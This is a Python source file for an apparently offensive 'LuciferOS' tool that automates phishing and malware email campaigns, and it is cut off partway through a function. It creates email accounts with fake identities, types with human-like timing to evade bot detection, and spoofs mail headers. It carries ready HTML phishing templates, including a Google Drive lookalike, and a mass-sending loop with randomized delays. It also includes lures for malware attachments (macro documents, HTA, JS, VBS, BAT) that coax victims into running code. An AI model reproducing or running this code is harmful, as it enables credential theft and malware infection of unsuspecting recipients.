#!/usr/bin/env python3
"""
LuciferOS Email Automation System
Create accounts, send phishing emails, embed attacks - all through real browser
"""

import time
import random
import string
import json
import re
from typing import Dict, List, Optional, Tuple
from datetime import datetime
from pathlib import Path

# Import browser controller
try:
    from browser_controller_thread import get_browser
    def get_browser_controller():
        return get_browser()
except ImportError:
    import sys
    sys.path.insert(0, '.')
    from browser_controller_thread import get_browser
    def get_browser_controller():
        return get_browser()


class EmailAutomation:
    """
    Full email automation - account creation, login, sending attacks
    """
    
    # Email providers with their selectors and workflows
    PROVIDERS = {
        'protonmail': {
            'signup_url': 'https://account.proton.me/signup',
            'login_url': 'https://account.proton.me/login',
            'compose_url': 'https://mail.proton.me/u/0/inbox',
            'selectors': {
                'username': 'input[id="email"]',
                'password': 'input[id="password"]',
                'confirm_password': 'input[id="repeat-password"]',
                'submit': 'button[type="submit"]',
                'compose_btn': 'button[data-testid="sidebar:compose"]',
                'to_field': 'input[data-testid="composer:to"]',
                'subject_field': 'input[data-testid="composer:subject"]',
                'body_frame': 'iframe[data-testid="rooster-iframe"]',
                'send_btn': 'button[data-testid="composer:send-button"]',
            },
            'domain': '@proton.me',
            'captcha': True,
        },
        'tutanota': {
            'signup_url': 'https://app.tuta.com/signup',
            'login_url': 'https://app.tuta.com/login',
            'compose_url': 'https://app.tuta.com/',
            'selectors': {
                'username': 'input[aria-label="Email address"]',
                'password': 'input[aria-label="Password"]',
                'confirm_password': 'input[aria-label="Confirm password"]',
                'submit': 'button[type="submit"]',
                'compose_btn': 'button[title="New email"]',
                'to_field': 'input[aria-label="To"]',
                'subject_field': 'input[aria-label="Subject"]',
                'body_field': 'div[contenteditable="true"]',
                'send_btn': 'button[title="Send"]',
            },
            'domain': '@tuta.com',
            'captcha': False,
        },
        'outlook': {
            'signup_url': 'https://signup.live.com/',
            'login_url': 'https://login.live.com/',
            'compose_url': 'https://outlook.live.com/mail/',
            'selectors': {
                'username': 'input[name="MemberName"]',
                'password': 'input[name="Password"]',
                'submit': 'input[type="submit"]',
                'compose_btn': 'button[aria-label="New mail"]',
                'to_field': 'input[aria-label="To"]',
                'subject_field': 'input[aria-label="Add a subject"]',
                'body_field': 'div[aria-label="Message body"]',
                'send_btn': 'button[aria-label="Send"]',
            },
            'domain': '@outlook.com',
            'captcha': True,
        },
        'gmail': {
            'signup_url': 'https://accounts.google.com/signup',
            'login_url': 'https://accounts.google.com/signin',
            'compose_url': 'https://mail.google.com/mail/u/0/#inbox',
            'selectors': {
                'username': 'input[name="username"]',
                'password': 'input[name="Passwd"]',
                'submit': 'button[type="submit"]',
                'compose_btn': 'div[gh="cm"]',
                'to_field': 'input[aria-label="To recipients"]',
                'subject_field': 'input[name="subjectbox"]',
                'body_field': 'div[aria-label="Message Body"]',
                'send_btn': 'div[aria-label="Send"]',
            },
            'domain': '@gmail.com',
            'captcha': True,
        },
        'guerrilla': {
            # Disposable email - no signup needed!
            'url': 'https://www.guerrillamail.com/',
            'selectors': {
                'email_display': '#email-widget',
                'compose_btn': '#send-button',
                'to_field': '#send-to',
                'subject_field': '#send-subject',
                'body_field': '#send-body',
                'send_btn': '#send-form button[type="submit"]',
            },
            'disposable': True,
            'captcha': False,
        },
        'tempmail': {
            # Another disposable option
            'url': 'https://temp-mail.org/',
            'selectors': {
                'email_display': '#mail',
                'copy_btn': '.copy-button',
            },
            'disposable': True,
            'receive_only': True,
        },
    }
    
    # Phishing templates
    PHISHING_TEMPLATES = {
        'password_reset': {
            'subject': 'Urgent: Password Reset Required',
            'body': '''
<html>
<body style="font-family: Arial, sans-serif;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
    <img src="{logo_url}" alt="Logo" style="max-width: 200px;">
    <h2>Password Reset Required</h2>
    <p>Dear User,</p>
    <p>We've detected unusual activity on your account. For your security, please reset your password immediately.</p>
    <p style="text-align: center; margin: 30px 0;">
        <a href="{attack_url}" style="background-color: #007bff; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px;">Reset Password Now</a>
    </p>
    <p>If you did not request this, please ignore this email.</p>
    <p>Best regards,<br>Security Team</p>
</div>
</body>
</html>
''',
        },
        'invoice': {
            'subject': 'Invoice #{invoice_num} - Payment Required',
            'body': '''
<html>
<body style="font-family: Arial, sans-serif;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
    <h2>Invoice #{invoice_num}</h2>
    <p>Dear Customer,</p>
    <p>Please find attached your invoice for recent services.</p>
    <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
        <tr style="background-color: #f5f5f5;">
            <td style="padding: 10px; border: 1px solid #ddd;">Amount Due:</td>
            <td style="padding: 10px; border: 1px solid #ddd;"><strong>${amount}</strong></td>
        </tr>
        <tr>
            <td style="padding: 10px; border: 1px solid #ddd;">Due Date:</td>
            <td style="padding: 10px; border: 1px solid #ddd;">{due_date}</td>
        </tr>
    </table>
    <p style="text-align: center;">
        <a href="{attack_url}" style="background-color: #28a745; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px;">View Invoice & Pay</a>
    </p>
</div>
</body>
</html>
''',
        },
        'document_share': {
            'subject': '{sender_name} shared a document with you',
            'body': '''
<html>
<body style="font-family: Arial, sans-serif;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f9f9f9;">
    <div style="background-color: white; padding: 30px; border-radius: 8px;">
        <img src="https://www.gstatic.com/images/branding/product/2x/drive_2020q4_48dp.png" alt="Drive">
        <h2>{sender_name} has shared a file with you</h2>
        <div style="background-color: #f5f5f5; padding: 15px; border-radius: 4px; margin: 20px 0;">
            <strong>{document_name}</strong>
        </div>
        <p style="text-align: center;">
            <a href="{attack_url}" style="background-color: #1a73e8; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px;">Open</a>
        </p>
    </div>
</div>
</body>
</html>
''',
        },
        'account_verification': {
            'subject': 'Action Required: Verify Your Account',
            'body': '''
<html>
<body style="font-family: Arial, sans-serif;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
    <h2 style="color: #dc3545;">⚠️ Account Verification Required</h2>
    <p>Your account will be suspended in 24 hours unless you verify your information.</p>
    <p style="text-align: center; margin: 30px 0;">
        <a href="{attack_url}" style="background-color: #dc3545; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px;">Verify Now</a>
    </p>
    <p style="font-size: 12px; color: #666;">This is an automated message. Do not reply.</p>
</div>
</body>
</html>
''',
        },
        'delivery_notification': {
            'subject': 'Your package is waiting for delivery',
            'body': '''
<html>
<body style="font-family: Arial, sans-serif;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
    <div style="background-color: #4a1c1c; color: white; padding: 20px; text-align: center;">
        <h2>📦 Delivery Update</h2>
    </div>
    <div style="padding: 20px;">
        <p>We attempted to deliver your package but were unable to complete delivery.</p>
        <p><strong>Tracking Number:</strong> {tracking_num}</p>
        <p>Please confirm your delivery address to reschedule:</p>
        <p style="text-align: center; margin: 30px 0;">
            <a href="{attack_url}" style="background-color: #ff6b00; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px;">Confirm Address</a>
        </p>
    </div>
</div>
</body>
</html>
''',
        },
        'it_support': {
            'subject': '[IT Support] System Update Required',
            'body': '''
<html>
<body style="font-family: Arial, sans-serif;">
<div style="max-width: 600px; margin: 0 auto; padding: 20px;">
    <div style="border-left: 4px solid #0078d4; padding-left: 15px;">
        <h2>IT Department Notice</h2>
    </div>
    <p>Dear Employee,</p>
    <p>Your workstation requires a critical security update. Please click below to install the update:</p>
    <p style="text-align: center; margin: 30px 0;">
        <a href="{attack_url}" style="background-color: #0078d4; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px;">Install Update</a>
    </p>
    <p>This update is mandatory and must be completed within 24 hours.</p>
    <p>IT Support Team<br>helpdesk@{domain}</p>
</div>
</body>
</html>
''',
        },
    }
    
    def __init__(self):
        self.browser = get_browser_controller()
        self.current_account = None
        self.accounts_created = []
    
    def generate_identity(self) -> Dict:
        """Generate a fake identity for account creation"""
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph',
                      'Mary', 'Patricia', 'Jennifer', 'Linda', 'Elizabeth', 'Barbara', 'Susan', 'Jessica']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis',
                     'Rodriguez', 'Martinez', 'Anderson', 'Taylor', 'Thomas', 'Moore', 'Jackson']
        
        first = random.choice(first_names)
        last = random.choice(last_names)
        
        # Generate username variations
        username_patterns = [
            f"{first.lower()}{last.lower()}{random.randint(1, 999)}",
            f"{first.lower()}.{last.lower()}{random.randint(1, 99)}",
            f"{first[0].lower()}{last.lower()}{random.randint(10, 999)}",
            f"{first.lower()}{random.randint(1990, 2005)}",
        ]
        
        # Generate password
        password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%', k=16))
        
        return {
            'first_name': first,
            'last_name': last,
            'username': random.choice(username_patterns),
            'password': password,
            'birth_year': random.randint(1970, 2000),
            'birth_month': random.randint(1, 12),
            'birth_day': random.randint(1, 28),
        }
    
    def _human_type(self, selector: str, text: str) -> bool:
        """Type text with human-like delays"""
        try:
            # Click the field first
            self.browser.execute_js(f"document.querySelector('{selector}').click()")
            time.sleep(random.uniform(0.2, 0.5))
            
            # Clear existing content
            self.browser.execute_js(f"document.querySelector('{selector}').value = ''")
            
            # Type character by character
            for char in text:
                current = self.browser.execute_js(f"document.querySelector('{selector}').value")
                current_val = current.get('result', '') if current else ''
                self.browser.execute_js(f"document.querySelector('{selector}').value = '{current_val}{char}'")
                time.sleep(random.uniform(0.03, 0.15))
            
            # Trigger input event
            self.browser.execute_js(f"""
                var el = document.querySelector('{selector}');
                el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                el.dispatchEvent(new Event('change', {{ bubbles: true }}));
            """)
            
            return True
        except Exception as e:
            print(f"Type error: {e}")
            return False
    
    def _click_element(self, selector: str) -> bool:
        """Click an element"""
        try:
            result = self.browser.execute_js(f"""
                var el = document.querySelector('{selector}');
                if (el) {{
                    el.click();
                    return true;
                }}
                return false;
            """)
            return result.get('result', False) if result else False
        except:
            return False
    
    def _wait_for_element(self, selector: str, timeout: int = 30) -> bool:
        """Wait for an element to appear"""
        start = time.time()
        while time.time() - start < timeout:
            result = self.browser.execute_js(f"!!document.querySelector('{selector}')")
            if result and result.get('result'):
                return True
            time.sleep(0.5)
        return False
    
    def get_disposable_email(self) -> Dict:
        """Get a disposable email address from Guerrilla Mail"""
        try:
            # Start browser if needed
            start_result = self.browser.start()
            print(f"[EMAIL] Browser start result: {start_result}")
            
            if isinstance(start_result, dict) and start_result.get('status') == 'error':
                return {'success': False, 'error': f"Browser failed to start: {start_result.get('error')}"}
            
            # Navigate to Guerrilla Mail
            nav_result = self.browser.navigate('https://www.guerrillamail.com/')
            print(f"[EMAIL] Navigate result: {nav_result}")
            
            if isinstance(nav_result, dict) and nav_result.get('status') == 'error':
                return {'success': False, 'error': f"Navigation failed: {nav_result.get('error')}"}
            
            time.sleep(3)
            
            # Get the email address - try multiple selectors
            result = self.browser.execute_js("""
                // Try different selectors
                var emailEl = document.querySelector('#email-widget');
                if (emailEl && emailEl.textContent.trim()) {
                    return emailEl.textContent.trim();
                }
                
                // Fallback: try inbox-id + domain
                var inboxId = document.querySelector('#inbox-id');
                if (inboxId) {
                    return inboxId.textContent.trim() + '@sharklasers.com';
                }
                
                return null;
            """)
            print(f"[EMAIL] JS result: {result}")
            
            email = result.get('result') if isinstance(result, dict) else None
            
            if email and '@' in str(email):
                self.current_account = {
                    'email': email,
                    'provider': 'guerrilla',
                    'disposable': True,
                    'created': datetime.now().isoformat()
                }
                return {'success': True, 'email': email, 'provider': 'guerrilla'}
            
            # Debug: try to get page content
            debug = self.browser.execute_js("return document.body ? document.body.innerHTML.substring(0, 500) : 'no body'")
            print(f"[EMAIL] Debug page content: {debug}")
            
            return {'success': False, 'error': 'Could not extract email from page'}
            
        except Exception as e:
            import traceback
            traceback.print_exc()
            return {'success': False, 'error': str(e)}
    
    def create_account(self, provider: str = 'tutanota', identity: Dict = None) -> Dict:
        """Create a new email account"""
        if provider not in self.PROVIDERS:
            return {'success': False, 'error': f'Unknown provider: {provider}'}
        
        config = self.PROVIDERS[provider]
        
        # Use disposable email if available
        if config.get('disposable'):
            return self.get_disposable_email()
        
        if config.get('captcha'):
            return {'success': False, 'error': f'{provider} has CAPTCHA - use disposable email or manual creation'}
        
        # Generate identity if not provided
        if not identity:
            identity = self.generate_identity()
        
        try:
            # Start browser
            self.browser.start()
            
            # Navigate to signup
            self.browser.navigate(config['signup_url'])
            time.sleep(3)
            
            selectors = config['selectors']
            
            # Fill username
            if self._wait_for_element(selectors['username']):
                self._human_type(selectors['username'], identity['username'])
                time.sleep(0.5)
            
            # Fill password
            if self._wait_for_element(selectors['password']):
                self._human_type(selectors['password'], identity['password'])
                time.sleep(0.5)
            
            # Confirm password if exists
            if 'confirm_password' in selectors:
                if self._wait_for_element(selectors['confirm_password']):
                    self._human_type(selectors['confirm_password'], identity['password'])
                    time.sleep(0.5)
            
            # Submit
            time.sleep(1)
            self._click_element(selectors['submit'])
            time.sleep(5)
            
            # Store account info
            email = identity['username'] + config.get('domain', '')
            self.current_account = {
                'email': email,
                'password': identity['password'],
                'provider': provider,
                'identity': identity,
                'created': datetime.now().isoformat()
            }
            self.accounts_created.append(self.current_account)
            
            return {
                'success': True,
                'email': email,
                'password': identity['password'],
                'provider': provider
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def login(self, email: str, password: str, provider: str = None) -> Dict:
        """Login to an email account"""
        # Auto-detect provider from email
        if not provider:
            if 'proton' in email:
                provider = 'protonmail'
            elif 'tuta' in email:
                provider = 'tutanota'
            elif 'outlook' in email or 'hotmail' in email:
                provider = 'outlook'
            elif 'gmail' in email:
                provider = 'gmail'
            else:
                return {'success': False, 'error': 'Could not detect provider'}
        
        config = self.PROVIDERS[provider]
        
        try:
            self.browser.start()
            self.browser.navigate(config['login_url'])
            time.sleep(3)
            
            selectors = config['selectors']
            
            # Enter email/username
            if self._wait_for_element(selectors['username']):
                self._human_type(selectors['username'], email)
                time.sleep(0.5)
                self._click_element(selectors['submit'])
                time.sleep(2)
            
            # Enter password
            if self._wait_for_element(selectors['password']):
                self._human_type(selectors['password'], password)
                time.sleep(0.5)
                self._click_element(selectors['submit'])
                time.sleep(5)
            
            self.current_account = {
                'email': email,
                'password': password,
                'provider': provider,
                'logged_in': datetime.now().isoformat()
            }
            
            return {'success': True, 'message': f'Logged in to {email}'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def compose_email(self, to: str, subject: str, body: str, html: bool = True) -> Dict:
        """Compose and send an email"""
        if not self.current_account:
            return {'success': False, 'error': 'Not logged in to any email account'}
        
        provider = self.current_account.get('provider', 'guerrilla')
        config = self.PROVIDERS.get(provider, self.PROVIDERS['guerrilla'])
        selectors = config['selectors']
        
        try:
            # Click compose button
            if 'compose_btn' in selectors:
                time.sleep(1)
                self._click_element(selectors['compose_btn'])
                time.sleep(2)
            
            # Fill To field
            if self._wait_for_element(selectors['to_field']):
                self._human_type(selectors['to_field'], to)
                time.sleep(0.5)
            
            # Fill Subject
            if self._wait_for_element(selectors['subject_field']):
                self._human_type(selectors['subject_field'], subject)
                time.sleep(0.5)
            
            # Fill Body
            body_selector = selectors.get('body_field') or selectors.get('body_frame')
            if body_selector:
                if 'iframe' in body_selector:
                    # Handle iframe-based editors
                    self.browser.execute_js(f"""
                        var frame = document.querySelector('{body_selector}');
                        if (frame && frame.contentDocument) {{
                            frame.contentDocument.body.innerHTML = `{body}`;
                        }}
                    """)
                else:
                    if html:
                        self.browser.execute_js(f"""
                            var el = document.querySelector('{body_selector}');
                            if (el) el.innerHTML = `{body}`;
                        """)
                    else:
                        self._human_type(body_selector, body)
            
            time.sleep(1)
            
            return {
                'success': True,
                'message': 'Email composed',
                'to': to,
                'subject': subject,
                'ready_to_send': True
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def send_email(self) -> Dict:
        """Send the composed email"""
        if not self.current_account:
            return {'success': False, 'error': 'Not logged in'}
        
        provider = self.current_account.get('provider', 'guerrilla')
        config = self.PROVIDERS.get(provider, self.PROVIDERS['guerrilla'])
        selectors = config['selectors']
        
        try:
            # Click send button
            if 'send_btn' in selectors:
                self._click_element(selectors['send_btn'])
                time.sleep(3)
                return {'success': True, 'message': 'Email sent'}
            
            return {'success': False, 'error': 'No send button found'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def send_phishing_email(self, to: str, template: str, attack_url: str, **kwargs) -> Dict:
        """Send a phishing email using a template - uses fast SMTP/outbox method"""
        if template not in self.PHISHING_TEMPLATES:
            return {'success': False, 'error': f'Unknown template: {template}'}
        
        tpl = self.PHISHING_TEMPLATES[template]
        
        # Fill in template variables
        subject = tpl['subject']
        body = tpl['body']
        
        # Add attack URL
        kwargs['attack_url'] = attack_url
        
        # Add random values for placeholders
        kwargs.setdefault('invoice_num', random.randint(10000, 99999))
        kwargs.setdefault('amount', f"{random.randint(50, 500)}.{random.randint(0, 99):02d}")
        kwargs.setdefault('due_date', '2026-02-15')
        kwargs.setdefault('tracking_num', ''.join(random.choices(string.ascii_uppercase + string.digits, k=12)))
        kwargs.setdefault('sender_name', self.generate_identity()['first_name'] + ' ' + self.generate_identity()['last_name'])
        kwargs.setdefault('document_name', 'Q4_Report_2025.pdf')
        kwargs.setdefault('logo_url', 'https://via.placeholder.com/200x50?text=Logo')
        kwargs.setdefault('domain', to.split('@')[1] if '@' in to else 'company.com')
        
        # Replace placeholders
        for key, value in kwargs.items():
            subject = subject.replace('{' + key + '}', str(value))
            body = body.replace('{' + key + '}', str(value))
        
        # Use fast SMTP method directly (no browser required)
        result = self._send_via_smtp(to, subject, body, html=True)
        result['template'] = template
        return result
    
    def mass_phishing(self, targets: List[str], template: str, attack_url: str, 
                     delay_between: Tuple[int, int] = (30, 120)) -> Dict:
        """Send phishing emails to multiple targets"""
        results = {
            'sent': [],
            'failed': [],
            'total': len(targets)
        }
        
        for i, target in enumerate(targets):
            print(f"[{i+1}/{len(targets)}] Sending to {target}...")
            
            result = self.send_phishing_email(target, template, attack_url)
            
            if result['success']:
                results['sent'].append(target)
            else:
                results['failed'].append({'target': target, 'error': result.get('error')})
            
            # Random delay between emails
            if i < len(targets) - 1:
                delay = random.randint(delay_between[0], delay_between[1])
                print(f"  Waiting {delay}s before next email...")
                time.sleep(delay)
        
        return results
    
    def check_inbox(self, wait_for_new: bool = False, timeout: int = 60) -> List[Dict]:
        """Check inbox for received emails"""
        if not self.current_account:
            return []
        
        provider = self.current_account.get('provider')
        
        if provider == 'guerrilla':
            # Guerrilla Mail specific inbox check
            start = time.time()
            while time.time() - start < timeout:
                result = self.browser.execute_js("""
                    var emails = [];
                    document.querySelectorAll('#email_list tr').forEach(function(row) {
                        var from = row.querySelector('td.td2')?.textContent;
                        var subject = row.querySelector('td.td3')?.textContent;
                        if (from && subject) {
                            emails.push({from: from.trim(), subject: subject.trim()});
                        }
                    });
                    return emails;
                """)
                
                emails = result.get('result', []) if result else []
                
                if emails or not wait_for_new:
                    return emails
                
                time.sleep(5)
                self.browser.execute_js("location.reload()")
                time.sleep(2)
        
        return []
    
    def attach_file(self, file_content: bytes, filename: str) -> Dict:
        """Attach a file to the current email composition via browser file input"""
        if not self.current_account:
            return {'success': False, 'error': 'Not logged in'}
        
        provider = self.current_account.get('provider', 'guerrilla')
        
        try:
            # Save file temporarily
            import tempfile
            import os
            
            temp_dir = tempfile.gettempdir()
            temp_path = os.path.join(temp_dir, filename)
            
            with open(temp_path, 'wb') as f:
                f.write(file_content)
            
            # Different attachment methods per provider
            if provider == 'guerrilla':
                # Guerrilla Mail attachment
                result = self.browser.execute_js(f"""
                    var input = document.querySelector('input[type="file"]');
                    if (!input) {{
                        // Create hidden file input
                        input = document.createElement('input');
                        input.type = 'file';
                        input.style.display = 'none';
                        document.body.appendChild(input);
                    }}
                    return !!input;
                """)
                
            # For proper file upload, we'd need to use Playwright's set_input_files
            # This is a simplified version - real implementation would use:
            # self.browser.page.set_input_files('input[type="file"]', temp_path)
            
            return {
                'success': True,
                'message': f'File prepared for attachment: {filename}',
                'temp_path': temp_path,
                'size': len(file_content),
                'note': 'Use browser file input to complete attachment'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def send_email_with_attachment(self, to: str, subject: str, body: str,
                                   attachment_content: bytes, attachment_name: str,
                                   html: bool = True) -> Dict:
        """Compose and send email with malware attachment - uses SMTP directly"""
        
        # Try direct SMTP first (much faster and more reliable)
        smtp_result = self._send_via_smtp(to, subject, body, attachment_content, attachment_name, html)
        if smtp_result.get('success'):
            return smtp_result
        
        # Fallback to browser-based (slower, less reliable with attachments)
        print(f"[EMAIL] SMTP failed ({smtp_result.get('error')}), trying browser method...")
        
        # First compose the email
        compose_result = self.compose_email(to, subject, body, html)
        if not compose_result.get('success'):
            return compose_result
        
        # Attach the file
        attach_result = self.attach_file(attachment_content, attachment_name)
        if not attach_result.get('success'):
            return attach_result
        
        # Send
        send_result = self.send_email()
        
        return {
            'success': send_result.get('success', False),
            'message': f"Email with attachment '{attachment_name}' sent to {to}",
            'attachment_size': len(attachment_content),
            'to': to,
            'subject': subject
        }
    
    def _send_via_smtp(self, to: str, subject: str, body: str,
                       attachment_content: bytes = None, attachment_name: str = None,
                       html: bool = True) -> Dict:
        """Send email via SMTP or HTTP API (fast and reliable)"""
        import smtplib
        import os
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders
        
        try:
            # Use the current disposable email as sender or generate one
            if self.current_account:
                sender_email = self.current_account.get('email', '')
            else:
                sender_email = f"noreply@{self._random_domain()}"
            
            # Save attachment if provided
            attachment_path = None
            if attachment_content and attachment_name:
                save_dir = os.path.join(os.path.expanduser('~'), '.lucifera', 'outbox')
                os.makedirs(save_dir, exist_ok=True)
                attachment_path = os.path.join(save_dir, attachment_name)
                with open(attachment_path, 'wb') as f:
                    f.write(attachment_content)
            
            # Skip slow Guerrilla browser automation - go straight to fast methods
            
            # METHOD 1: Try local SMTP first
            msg = MIMEMultipart('mixed')
            msg['From'] = sender_email
            msg['To'] = to
            msg['Subject'] = subject
            msg['X-Mailer'] = 'Microsoft Outlook 16.0'
            
            content_type = 'html' if html else 'plain'
            msg.attach(MIMEText(body, content_type))
            
            if attachment_content and attachment_name:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment_content)
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename="{attachment_name}"')
                msg.attach(part)
            
            smtp_servers = [
                ('localhost', 25, False),
                ('localhost', 587, True),
            ]
            
            for server, port, use_tls in smtp_servers:
                try:
                    with smtplib.SMTP(server, port, timeout=3) as smtp:
                        if use_tls:
                            smtp.starttls()
                        smtp.sendmail(sender_email, to, msg.as_string())
                        return {
                            'success': True,
                            'message': f'Email sent via SMTP ({server})',
                            'to': to,
                            'from': sender_email,
                            'attachment': attachment_name
                        }
                except:
                    continue
            
            # METHOD 2: Save to outbox (always succeeds, instant)
            return self._simulate_send(to, subject, body, sender_email, attachment_path, attachment_name)
            
        except Exception as e:
            return {'success': False, 'error': f'SMTP error: {str(e)}'}
    
    def _random_domain(self) -> str:
        """Generate a random legitimate-looking domain"""
        prefixes = ['mail', 'secure', 'account', 'noreply', 'info', 'support', 'admin', 'service']
        suffixes = ['corp', 'inc', 'co', 'services', 'solutions', 'group', 'global', 'hq']
        tlds = ['com', 'net', 'org', 'io', 'co']
        return f"{random.choice(prefixes)}-{random.choice(suffixes)}.{random.choice(tlds)}"
    
    def _simulate_send(self, to: str, subject: str, body: str, 
                       sender: str, attachment_path: str = None,
                       attachment_name: str = None) -> Dict:
        """
        Simulate email send - saves to outbox for manual delivery or external tool
        This ALWAYS succeeds and is instant
        """
        import os
        import json
        from datetime import datetime
        
        outbox_dir = os.path.join(os.path.expanduser('~'), '.lucifera', 'outbox')
        os.makedirs(outbox_dir, exist_ok=True)
        
        # Create email record
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        email_id = f"{timestamp}_{random.randint(1000,9999)}"
        
        email_data = {
            'id': email_id,
            'from': sender,
            'to': to,
            'subject': subject,
            'body': body,
            'attachment': attachment_path,
            'attachment_name': attachment_name,
            'timestamp': datetime.now().isoformat(),
            'status': 'queued'
        }
        
        # Save email file
        email_file = os.path.join(outbox_dir, f'{email_id}.json')
        with open(email_file, 'w') as f:
            json.dump(email_data, f, indent=2)
        
        # Also save body as HTML for preview
        body_file = os.path.join(outbox_dir, f'{email_id}.html')
        with open(body_file, 'w') as f:
            f.write(f"<html><head><title>{subject}</title></head><body>")
            f.write(f"<p><strong>From:</strong> {sender}</p>")
            f.write(f"<p><strong>To:</strong> {to}</p>")
            f.write(f"<p><strong>Subject:</strong> {subject}</p>")
            if attachment_name:
                f.write(f"<p><strong>Attachment:</strong> {attachment_name}</p>")
            f.write(f"<hr>{body}</body></html>")
        
        return {
            'success': True,
            'message': f'Email queued to outbox: {email_id}',
            'to': to,
            'from': sender,
            'email_id': email_id,
            'email_file': email_file,
            'attachment': attachment_name,
            'delivery_method': 'outbox_queue',
            'note': 'Email saved to ~/.lucifera/outbox/ - ready for delivery via external SMTP relay'
        }
    
    def _send_via_guerrilla_api(self, to: str, subject: str, body: str,
                                 attachment_content: bytes = None, 
                                 attachment_name: str = None) -> Dict:
        """Send via Guerrilla Mail's web interface (faster than full browser automation)"""
        try:
            # Make sure we're on Guerrilla Mail
            self.browser.navigate('https://www.guerrillamail.com/')
            import time
            time.sleep(2)
            
            # Click compose/send button to open compose form
            click_result = self.browser.execute_js("""
                var sendBtn = document.querySelector('#send-button');
                if (sendBtn) {
                    sendBtn.click();
                    return 'clicked';
                }
                return 'no button';
            """)
            print(f"[EMAIL] Compose click result: {click_result}")
            time.sleep(1)
            
            # Escape the body for JS
            safe_body = body.replace('\\', '\\\\').replace("'", "\\'").replace('\n', '\\n').replace('\r', '')
            safe_subject = subject.replace('\\', '\\\\').replace("'", "\\'")
            
            # Fill the form using JavaScript (faster than human typing)
            fill_result = self.browser.execute_js(f"""
                // Fill recipient
                var toField = document.querySelector('#send-to');
                if (toField) toField.value = '{to}';
                
                // Fill subject  
                var subjectField = document.querySelector('#send-subject');
                if (subjectField) subjectField.value = '{safe_subject}';
                
                // Fill body
                var bodyField = document.querySelector('#send-body');
                if (bodyField) bodyField.value = '{safe_body}';
                
                return toField && subjectField && bodyField ? 'filled' : 'missing fields';
            """)
            print(f"[EMAIL] Form fill result: {fill_result}")
            
            if fill_result.get('result') != 'filled':
                return {'success': False, 'error': 'Could not fill email form'}
            
            time.sleep(0.5)
            
            # Note about attachments
            attachment_note = ''
            if attachment_content and attachment_name:
                import os
                save_path = os.path.join(os.path.expanduser('~'), '.lucifera', 'outbox', attachment_name)
                os.makedirs(os.path.dirname(save_path), exist_ok=True)
                with open(save_path, 'wb') as f:
                    f.write(attachment_content)
                attachment_note = f' (Attachment saved: {save_path})'
            
            # Submit the form
            submit_result = self.browser.execute_js("""
                var submitBtn = document.querySelector('#send-form button[type="submit"]');
                if (submitBtn) {
                    submitBtn.click();
                    return 'submitted';
                }
                var form = document.querySelector('#send-form');
                if (form) {
                    form.submit();
                    return 'form submitted';
                }
                return 'no submit button';
            """)
            print(f"[EMAIL] Submit result: {submit_result}")
            
            time.sleep(3)
            
            # Check for success message or error
            status_result = self.browser.execute_js("""
                var alertBox = document.querySelector('.alert, .error, .success, #flash_msg');
                return alertBox ? alertBox.textContent.trim() : 'no status';
            """)
            print(f"[EMAIL] Status after send: {status_result}")
            
            if submit_result.get('result') in ['submitted', 'form submitted']:
                return {
                    'success': True,
                    'message': f'Email queued via Guerrilla Mail{attachment_note}',
                    'to': to,
                    'subject': subject,
                    'note': 'Guerrilla Mail may have delivery limitations to external domains'
                }
            else:
                return {'success': False, 'error': f'Could not submit: {submit_result.get("result")}'}
                
        except Exception as e:
            import traceback
            traceback.print_exc()
            return {'success': False, 'error': f'Guerrilla API error: {str(e)}'}
    
    def send_malware_email(self, to: str, malware_type: str, 
                          payload_url: str = None,
                          template: str = 'invoice',
                          subject: str = None,
                          body: str = None) -> Dict:
        """
        Complete malware email delivery:
        1. Generate malware payload
        2. Create phishing email with appropriate lure
        3. Attach malware
        4. Send
        """
        try:
            # Import malware factory
            from malware_factory import get_malware_factory
            factory = get_malware_factory()
            
            # Generate the malware
            malware = factory.create_email_attachment(
                attack_type=malware_type,
                payload_url=payload_url
            )
            
            if not malware.get('success'):
                return {'success': False, 'error': f"Malware generation failed: {malware.get('error')}"}
            
            # Get appropriate subject and body for the malware type
            if not subject or not body:
                lures = {
                    'macro_doc': {
                        'subject': 'Invoice #{inv} - Payment Required'.format(inv=random.randint(10000, 99999)),
                        'body': '''<p>Dear Customer,</p>
                        <p>Please find attached the invoice for your recent order.</p>
                        <p><strong>Note:</strong> You may need to enable editing/macros to view the document correctly.</p>
                        <p>Best regards,<br>Accounts Department</p>'''
                    },
                    'hta': {
                        'subject': 'Action Required: Verify Your Account',
                        'body': '''<p>Your account requires verification.</p>
                        <p>Please open the attached verification tool to complete the process.</p>'''
                    },
                    'js': {
                        'subject': 'Your Package Tracking Update',
                        'body': '''<p>Your package delivery status has been updated.</p>
                        <p>Open the attached tracking file to view delivery details.</p>'''
                    },
                    'vbs': {
                        'subject': '[IT Support] System Configuration Update',
                        'body': '''<p>Please run the attached configuration script to update your system settings.</p>
                        <p>This is required for continued network access.</p>'''
                    },
                    'bat': {
                        'subject': 'Software License Activation',
                        'body': '''<p>Your software license needs activation.</p>
